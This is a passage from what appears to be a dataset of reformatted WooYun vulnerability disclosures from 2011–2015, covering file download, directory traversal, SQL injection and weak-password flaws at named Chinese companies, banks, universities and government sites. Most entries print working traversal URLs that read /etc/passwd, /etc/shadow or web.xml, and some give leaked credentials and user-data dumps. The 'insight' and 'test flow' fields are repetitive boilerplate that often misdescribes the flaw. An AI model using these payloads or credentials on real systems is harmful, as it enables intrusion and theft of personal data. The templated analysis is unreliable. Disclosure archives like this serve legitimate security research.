**POC**: 上面都有了，发几个其它配置文件截图吧。今天的LOG 系统还在报错唉这么配置c3p0不会有BUG么？tomcat都换BONECP了其它的不发了，那个win的telnet配置文件也可以下载吧？帐号密码什么的呢？然后传个SHELL呢？

**绕过**: 直接利用

**修复**: 找开发公司去吧，又不我开发的。
---

---
### [wooyun-2015-0159464] 某省省直公积金网多处漏洞打包
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台权限绕过http://**.**.**.**/htgl/top.asphttp://**.**.**.**/admin/top.asp留言板弱口令http://**.**.**.**/gbook/?18_1.html账号密码admin   admin目录遍历http://**.**.**.**/dbhttp://**.**.**.**/images/_noteshttp://**.**.**.**/aspnet_client/system_webhttp://**.**.**.**/db.rar直接下载http://**.**.**.**/aspnet_client

**POC**: 后台权限绕过http://**.**.**.**/htgl/top.asphttp://**.**.**.**/admin/top.asp留言板弱口令http://**.**.**.**/gbook/?18_1.html账号密码admin   admin目录遍历http://**.**.**.**/dbhttp://**.**.**.**/images/_noteshttp://**.**.**.**/aspnet_client/system_webhttp://**.**.**.**/db.rar直接下载http://**.**.**.**/aspnet_client

**绕过**: 过滤绕过

**修复**: 赶紧修复吧
---

---
### [wooyun-2013-020256] 天津东方之珠网站敏感文件下载漏洞,交易记录泄露
**厂商**: 天津东方之珠 | **年份**: 2013 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可构造如http://www.dongfangzhizhu.net/download.aspx?file=xxx.xxx的链接，下载一些文件，包括网站配置文件，从配置文件中又可以获取到农行交易记录

**POC**: 网站配置文件：农行交易信息：

**绕过**: 直接利用

**修复**: 对download.aspx文件的下载进行限制
---

---
### [wooyun-2015-0101704] 07073某站某漏洞泄露22036611名用户数据
**厂商**: 07073.com | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: news.07073.com/plus/digg_ajax9.php?type=&id=1071264参数：type所有的服务器，其中bbs073应该就是你们的论坛主库了，用户库肯定就是这里附上列表：Database: bbs073+---------------------------+---------+| Table                     | Entries |+---------------------------+---------+| uc_members                | 22036611 || uchome_gift_ram           | 17379539 || uc_memberfields           | 16793530 || uc_members_ext            | 7251715 || uc_pms

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0150337] 正方协同办公系统任意文件下载漏洞
**厂商**: 正方软件股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 玩安全中无意间google搜到文件下载的链接，仔细发现是zfoa系统；经过url解码构造，发现只要截断就可以下载任意文件：案例：**.**.**.**:8018/zfoa/gwxxbviewhtml.do?theAction=downdoc&gw_title=%00&htwj_recordid=../../../../../../../../../../.././../etc/passwd%00http://**.**.**.**:8018/zfoa/gwxxbviewhtml.do?theAction=downdoc&gw_title=%00&htwj_recordid=../../../../../../../../../../.././../etc/passwd%00http://**.**.**.**/gwxxbviewhtml.do?theAction=downdoc&gw_ti

**POC**: 1#:http://**.**.**.**/gwxxbviewhtml.do?theAction=downdoc&gw_title=%00&htwj_recordid=../../../../../../../../../../.././../etc/passwd%002#:**.**.**.**/zfoa/gwxxbviewhtml.do?theAction=downdoc&htwj_recordid=../../WEB-INF/web.xml%00

**绕过**: 截断攻击

**修复**: 加强输入验证
---

---
### [wooyun-2015-0137477] 蓝汛错误配置数据+某FTP服务器权限泄露
**厂商**: ChinaCache | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. 目录遍历：地址：http://puppetmaster.chinacache.com:8000/2. 其中一个文件 http://puppetmaster.chinacache.com:8000/demo.sh又发现两个个目录遍历http://119.90.1.204/wr/http://42.62.25.8:9090/yufeng/已经泄露了很多源码和数据文件。

**POC**: 东西太多了，简单看了看，找到一个ftp。3. http://119.90.1.204/wr/ftp.sh 发现一个ftp账号ftp 223.202.17.206cclogalihomeinchina而且没有做目录限制，直接跳到根目录：代码泄露导致的问题肯定还有很多，没时间进一步利用了，赶快修补吧。

**绕过**: 直接利用

**修复**: 修改错误配置。
---

---
### [wooyun-2015-0128809] 山西天眼视讯视频与云服务弱口令(涉及用户信息)
**厂商**: 山西天眼视讯视频与云服务 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个是下载中心，密码他们的官网itsmvhttp://www.itsmv.com/_d276389259.htm把文件下载下来，发现一个这样的用户tytest测试密码123456  ok这个是一些用户信息

**POC**: 这个是下载中心，密码他们的官网itsmvhttp://www.itsmv.com/_d276389259.htm把文件下载下来，发现一个这样的用户tytest测试密码123456  ok

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-068138] TurboMail邮件系统任意文件读取漏洞（需管理权限）
**厂商**: TurboMail | **年份**: 2014 | **类型**: 文件包含

**元思考**: 触发信号: 参数注入, 后台管理

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 邮件后台管理进行“WEB日志查看”时存在任意文件读取漏洞。漏洞代码位于TomcatLogAjax.class，其中getLog函数读取web服务器日志文件的源代码实现如下：publicstatic void getLog(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException{MailSession ms = WebUtil.getms(request,response);if (ms == null) {AjaxUtil.ajaxFail(request, response,"info.nologin", null);return;}UserInfo userinfo = ms.userinfo;if (userinfo == null) {AjaxUtil

**POC**: 使用邮箱管理员账号登陆邮箱管理后台，进行邮件“日志查看”，选择“web服务器日志”http请求包如下：使用burpsuit修改http请求包的logFile参数为../../../../../../../../../../../../../windows/win.ini：可以发现已经成功读取服务器上的文件：测试下读取c:/boot.ini：

**绕过**: 直接利用

**修复**: 禁止读取的文件名包含/和\
---

---
### [wooyun-2015-0122940] 三明公积金中心目录遍历漏洞涉及30余万人身份证、手机、住址信息
**厂商**: 三明公积金中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.smgjj.com/UploadFile/Import/DataTemp/此目录下，几个6月份最近的备份日志文件都可以下载。有30多万数据，信息很全面。http://www.smgjj.com//newsbolcksecondlist.aspx?class=91be1fbd-5560-4fd0-91b6-2d0f5ae2f5b0&parentclass=  延时注入点一枚www.smgjj.com/database/DataInput.aspx    会员信息导入系统，如果导入了，那么，呵呵。。。。

**POC**: 会员导入系统

**绕过**: 直接利用

**修复**: 建议找个懂得人，设置下IIS的目录权限。
---

---
### [wooyun-2013-019360] 优酷某站服务器任意文件读取
**厂商**: 优酷 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一些旧版本的Resin服务器存在读取任意文件或者直接列出目标目录文件的漏洞urls:http://index.youku.com/resin-doc/examples/ioc-periodictask/viewfile?file=index.xtphttp://index.youku.com/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/web.xml不太懂爪哇，没找到敏感文件，但是还是个问题吧

**POC**: url:http://index.youku.com/resin-doc/examples/ioc-periodictask/viewfile?file=admin/mbean.jspcode:<%@ page session="false" import="javax.management.* com.caucho.jmx.Jmx java.util.*" %><%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %><%// stop browser from caching the pageresponse.setHe

**绕过**: 直接利用

**修复**: 升级服务器版本或设置权限
---

---
### [wooyun-2015-0162888] 三只松鼠某站备份文件下载
**厂商**: 3songshu.com | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://track.3songshu.com/app.zip大小 44.6 M

**POC**: http://track.3songshu.com/app.zip

**绕过**: 直接利用

**修复**: 1. 删除备份文件。2. 源码最好以发布形式部署。3. 部署时删除 bin 下的 pdb 等敏感文件。
---

---
### [wooyun-2013-042086] 敏感信息泄露系列#6 服务端默认配置导致海量用户信息泄露 (目测酷狗有3.6亿用户)
**厂商**: 酷狗 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1 概述由于酷狗某台服务器IIS配置错误，导致任意HTTP请求均可列出服务器上的WEB目录，致使骇客可下载到任意数据或文件，骇客可以通过收集或挖掘这些保护不足的数据，利用这些信息对酷狗信息系统实施进一步的攻击。#2 问题服务器http://120.31.133.202/http://61.142.208.206:8081/#3 漏洞描述（配置错误导致的目录遍历）120.31.133.202 - /226/[转到父目录]2013年7月8日    18:36           18 change.cmd2013年7月17日    19:21   8793860608 KuGooUserInfo_35_backup_201307171920.tar61.142.208.206 - /2011年2月22日    11:12         4787 FTP20110216.PY2013年10月

**POC**: #4 通过HTTP请求，即可下载服务器上的文件至本地{为了安全测试，我下载了这个文件到本地，测试完毕后已经删除！}http://120.31.133.202/226/xxxxx.tar打开的时候提示错误，表明这并不是一个tar的压缩文件通过十六进制编辑，结合其他遍历出来的文件名，我们发现这完完全全是一个SQL Server数据库备份文件。#5 还原数据KuGooUserInfo表#6 信息挖掘通过还原信息，得出默认的数据库名为：KuGooUserInfo_35，统计了数据表条数记录，为1000万条。说明酷狗针对用户信息做了分表处理，_35 代表第35个表，35 * 1000万，刚好3.5亿！继

**绕过**: 直接利用

**修复**: #1 网络边界需要认真对待。#2 杜绝为了方便而造成的不必要的安全风险或信息泄露。#3 安全是一个整体，保证安全不在于强大的地方有多强大，而在于真正薄弱的地方在哪里。
---

---
### [wooyun-2011-03070] 微博--微收藏多处任意文件读取漏洞
**厂商**: 新浪 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 程序应该是用了curl库吧，没有注意到file://协议，导致本地任意文件读取。。。

**POC**: 程序应该是用了curl库吧，没有注意到file://协议，导致本地任意文件读取。。。http://mark.appsina.com/read.php?sid=2247&type=0&url=file:///etc/passwd&pos=1&from=0&gsid=3_5bc7d139d8527229d2df38b6765c6b91b8428eda66bd8c1e61b5df&vt=2为什么这样说？可以做如下测试：http://mark.appsina.com/read.php?sid=2247&type=0&url=http://127.0.0.1/&pos=1&from=0&gsid=3_5

**绕过**: 直接利用

**修复**: 这漏洞应该早就有人发现了吧。
---

---
### [wooyun-2015-0119414] 西安电子科技大学某站任意文件下载漏洞
**厂商**: 西安电子科技大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题网站：西安电子科技大学研究生考生报名平台http://yjsxt.xidian.edu.cn/pub/examinee/findOptimalPlanAction.do?activityType=1检查源码，可发现文件下载链接直接使用绝对路径测试发现webserver以root权限运行直接读敏感文件

**POC**: yjsxt.xidian.edu.cn/pub/jap/affix/myfile.jsp?savePath=/etc/shadow&filename=1.bak

**绕过**: 直接利用

**修复**: 限制文件读取权限
---

---
### [wooyun-2014-061574] 中国消防产品信息网任意文件下载
**厂商**: 中国消防产品信息网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站首页：http://www.cccf.com.cn/getIndex.do下载链接：http://www.cccf.com.cn/net/pages/download.jsp?path=uploads%5C2013%5C04%5C11%5C1310185844586.doc&name=%C3%F0%BB%F0%C6%F7%B2%FA%C6%B7..doc直接将path值改为你要下载的文件名，就可以download之，例如：http://www.cccf.com.cn/net/pages/download.jsp?path=/net/pages/download.jsp结果如下：我们在来看一下download。jsp文件：源码如下：<%@page contentType="application/x-msdownload"%><%@ page language="java"  pageE

**POC**: 同上

**绕过**: 直接利用

**修复**: 做一下下载过滤，只能下载pdf、xls、doc、ppt文件，应该能保你一时平安。
---

---
### [wooyun-2012-07704] 上海高信物流目录遍历漏洞
**厂商**: 高信物流 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的！
---

---
### [wooyun-2012-016291] 新浪某子站数据库文件下载
**厂商**: 新浪 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 新浪子站，新浪育儿（http://baby.sina.com.cn/）存在SQL输入库文件下载数据库文件下载地址：http://baby.sina.com.cn/data.sql不晓得是不是被渗透进去了哦

**POC**: .sql 的文件后缀

**绕过**: 直接利用

**修复**: 删除该备份文件，整站安全检查一下
---

---
### [wooyun-2015-0157355] 唯品会某系统文件下载
**厂商**: 唯品会 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://800.vip.com/live800/downloadserver?fid=/&act=2&isAbleZip=0&fna=../../../etc/passwd&a=1

**POC**: http://800.vip.com/live800/downloadserver?fid=/&act=2&isAbleZip=0&fna=../../../etc/passwd&a=1

**绕过**: 直接利用

**修复**: 1.首选删除downloadserver2.过滤参数吧！
---

---
### [wooyun-2013-027066] 各类政府网使用某程序导致任意文件读取
**厂商**: 某程序 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.hbjs.gov.cn/jcms/m_5_e/init/messagebook/opr_readfile.jsp?filename=../../../../../../../../../../../../../../../../etc/passwd使用jcms导致任意文件读取还有很多例子 比如http://www.lzcgq.gov.cn/jcms/m_5_e/init/messagebook/opr_readfile.jsp?filename=../../../../../../../../../../../../../../../../etc/passwd 等你们自己找把

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-024765] 当当网主站本地文件读取漏洞
**厂商**: 当当网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://www.dangdang.com/default_json_file_2012.php?area_num=/../..//../..//../..//../..//../..//etc/passwd%00&area_name=L3&screensize=1920&t=0.002583379581056311漏洞测试：GET /default_json_file_2012.php?area_num=/../..//../..//../..//../..//../..//etc/passwd%00&area_name=G62&id=1&screensize=1920&t=0.6488959508096191 HTTP/1.1Referer: http://www.dangdang.com:80/Accept: */*X-Requested-With: XMLHttpRe

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 和影视频道一样。
---

---
### [wooyun-2015-0161078] 太平保险某主站设计缺陷服务器任意文件下载
**厂商**: cntaiping.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标：http://www.hk.cntaiping.com形如，http://www.hk.cntaiping.com/include/getfile.php?filepath=路径&file=名字+格式&filename=名字数据库配置信息----------------------------------------------------------------------------------在include/getfile.php中$path = '../';$filepath = str_replace("../", "", $filepath);$file = str_replace("../", "", $file);if(is_file($path.$filepath.$file)){$filerename = $filename;$file = $file;$pat

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 你懂的
---

---
### [wooyun-2013-036839] 妈咪宝贝官网系统配置不当导致部分目录遍历可能至源代码泄漏
**厂商**: 妈咪宝贝 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 有点目录可以遍历，有的不可以。。。源码泄露

**POC**: 妈咪宝贝官网系统配置不当导致部分目录遍历，源代码泄漏。https://www.mamypoko.cn/images/newmama/.svn/entrieshttps://www.mamypoko.cn/images

**绕过**: 直接利用

**修复**: 在服务器上限制对这些目录的访问。。
---

---
### [wooyun-2014-069009] 某政府通用CMS任意文件下载范围广
**厂商**: 金宇恒内容管理系统 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: google搜索inurl:/News.shtml?ide=使用的是：金宇恒内容管理系统广东金宇恒科技有限公司http://txjy.dg.gov.cn/adminroot/login.htm可下载web路径下的任意文件，请求：http://txjy.dg.gov.cn/adminroot/common/downLoadFile.jsp?filepath=adminroot/default.jsp&filename=Nonehttp://txjy.dg.gov.cn/adminroot/common/downLoadFile.jsp?filepath=/WEB-INF/web.xml&filename=None

**POC**: 影响范围：http://txjy.dg.gov.cn/adminroot/common/downLoadFile.jsp?filepath=adminroot/default.jsp&filename=Nonehttp://www.jtzcglpt.com/adminroot/common/downLoadFile.jsp?filepath=adminroot/default.jsp&filename=Nonehttp://wy.chancheng.gov.cn/adminroot/common/downLoadFile.jsp?filepath=adminroot/default.jsp&f

**绕过**: 直接利用

**修复**: 限制下载的路径
---

---
### [wooyun-2015-0111188] 日淘转运公司服务器遍历，泄露大量用户身份证照片
**厂商**: 日本BLD INTERNATIONAL | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 日本直通转运公司网站服务器存在目录遍历漏洞，通过robots.txt可查看存在的敏感目录，然后直接访问目录可查看目录内容其中http://www.jpzto.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/auth_image_data/目录下存有用户上传的身份证，导致用户敏感信息泄露

**POC**: 地址http://www.jpzto.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/auth_image_data/http://www.jpzto.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/auth_image_data/189_f0652af0229cb6b30dddf9d68ba84ce6.jpg

**绕过**: 直接利用

**修复**: 修改服务器配置，关闭目录浏览功能
---

---
### [wooyun-2014-082292] 金蝶政务GSiS服务平台任意文件下载和一处越权
**厂商**: 金蝶 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 程序名称：Kingdee GSIS开发公司：金蝶漏洞类型：任意文件下载、越权操作漏洞文件：/portal/filedownload/download.action  任意文件下载/kdgs/core/user/userlist.jsp          越权操作，可增删改用户信息关键词：inurl:/kdgs/biz/收集几个案例http://www.hanchuan.gov.cn:8080/kdgs/http://gk.sxgp.gov.cn:8080/kdgs/http://fwzx.bazhou.gov.cn/kdgs/http://222.163.238.198:8080/kdgs/http://gk.sxgaoping.gov.cn:8080/kdgs/漏洞成因：对文件名及目录没有过滤，导致任意文件可下载漏洞利用：注册一个普通用户，然后构造/kdgs/portal/filedow

**POC**: 如上

**绕过**: 直接利用

**修复**: 文件下载过滤权限控制
---

---
### [wooyun-2014-057420] 中兴某设备任意文件下载
**厂商**: 中兴通讯股份有限公司 | **年份**: 2014 | **类型**: 设计不当

**元思考**: 触发信号: 功能测试

**洞察**: 设计不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 这是登陆界面：这个是遍历etc/passwd  提示下载保存：这个是读到的etc/passwd文件:

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-082421] 邮政某站敏感信息泄露（成功登录后台）
**厂商**: 中国邮政集团公司信息技术局 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件下载地址：http://www.hspost.com.cn/hspost.rar打开文件夹mywebdata，看到数据库文件得到管理员用户名、密码hspost 123456分析备份文件得到后台登录地址成功登录后台

**POC**: 见上

**绕过**: 直接利用

**修复**: Null
---

---
### [wooyun-2015-0157263] 某敏感单位任意文件下载导致敏感信息泄露
**厂商**: 公安部一所 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞单位黑龙江省公安厅交通警察总队漏洞网站http://**.**.**.**/存在任意文件下载

**POC**: 下载web.xmlhttp://**.**.**.**/hljjjzd/jsp/web/index/webDownload.do?inputPath=/WEB-INF/web.xml&filename=ss.txt下载applicationContext.xmlhttp://**.**.**.**/hljjjzd/jsp/web/index/webDownload.do?inputPath=/WEB-INF/classes/applicationContext.xml&filename=ss.txt数据库配置信息

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-099916] 腾讯某站配置不当可导致部分地区腾讯视频播放源损坏
**厂商**: 腾讯 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://transport.dnion.com/index.zul这个站是腾讯使用的dnion cdn服务 主要用来做视频cdn分发和直播rtmp流分发具体负责的地区不明确。由于服务配置不当 导致任意文件读取 root权限读取history找到大量配置文件

**POC**: /var/local/apache-tomcat-6.0.35/logs/tencent-info.log这是分发日志读web.xml找到数据库 并成功外连800多万视频来源地址源码可下载 分发接口泄露 可以恶意分发http://transport.dnion.com:1863/../../../../../../../var/local/apache-tomcat-twodb/webapps/videoTransPort2.01_online_1.0.tar.gz本机3306开放 可以mysql外连perl curl.pl transport.dnion.com:1863 /root/.my

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0139740] 上海银行某系统任意文件下载导致敏感信息泄露
**厂商**: 上海银行 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 详细说明见漏洞证明。

**POC**: 上海银行网上学习平台（系统URL地址：http://learning.bankofshanghai.com/）存在任意文件下载漏洞，导致敏感信息泄露。系统首页为，确定上海银行系统举例说明：1.直接访问如下URL，下载wis18.jar包http://learning.bankofshanghai.com/wis18/file.showimage.flow?filename=../WEB-INF/lib/wis18.jar可以对该jar包进行反编译获取源代码。2.数据库配置文件下载,直接访问如下URLhttp://learning.bankofshanghai.com/wis18/file.sh

**绕过**: 直接利用

**修复**: 你们是行家。
---

---
### [wooyun-2015-0150153] 老来宝某处存在目录遍历可泄露内部源码和敏感信息
**厂商**: 上海旭日养老服务有限公司 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 上传功能

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网址：http://mall.laolaibao.com/data/，http://mall.laolaibao.com/includes/，存在目录遍历，可泄露数据库配置信息、ecs用户信息和其它源码信息。另外某处可上传任意文件，但未找到上传路径。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 设置权限
---

---
### [wooyun-2014-051924] 北京致远某系统任意文件下载漏洞
**厂商**: seeyon.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接上图吧，没有什么东西

**POC**: 如上

**绕过**: 直接利用

**修复**: 过滤../
---

---
### [wooyun-2013-019421] 西安市某政府局存在任意文件下载漏洞
**厂商**: gov部门 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接上图！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2014-065268] OTCMS网钛文章管理系统非授权任意文件下载漏洞
**厂商**: otcms.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: other.asp从OTCMS 2.3 版本,到2.84版本 是这个样子,其他版本不详可以用来下载数据库,鸡肋在于后台路径

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 包含check.asp
---

---
### [wooyun-2014-058143] 某厂商通用型任意文件读取漏洞（至少影响该厂商两套以上系统）
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 厂商：北京希尔信息技术有限公司 http://www.heerit.com/dxanli.htm搜索：http://www.google.de/#filter=0&newwindow=1&q=inurl:/forget_password.jsp+%22%E8%AF%B7%E8%BE%93%E5%85%A5%E6%82%A8%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%22主要影响的目前发现是OA和校友网。

**POC**: 如下面这套OA：http://oa.bnu.edu.cn/bnuoa/vfs?path=../../../../../../../../../../etc/passwd下面这套还是OA：http://oa.lit.edu.cn/litoa/vfs?path=../../../../../../../../../../etc/passwd接着还是OA：http://oa.ccucm.edu.cn/oa/vfs?path=../../../../../../../../../../etc/passwd下面这个还是OA：http://www.biem.edu.cn/biemoa/vfs?path=.

**绕过**: 直接利用

**修复**: 通用可以证明了吧……
---

---
### [wooyun-2014-065243] 摇篮网一些小问题（打包）
**厂商**: 摇篮网 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.SVN泄露http://www.yaolan.com/videos/.svn/entries2.文件下载http://www.yaolan.com/zhishi/tangshishaicha/tangshishaicha.rarhttp://www.yaolan.com/adservice/adservice.rar

**POC**: 待会还有一批~接下来就不是小问题啦 :-D

**绕过**: 直接利用

**修复**: 你们比较专业、
---

---
### [wooyun-2015-0151171] 重庆三峡急救中心医院多个漏洞打包
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能, 后台管理

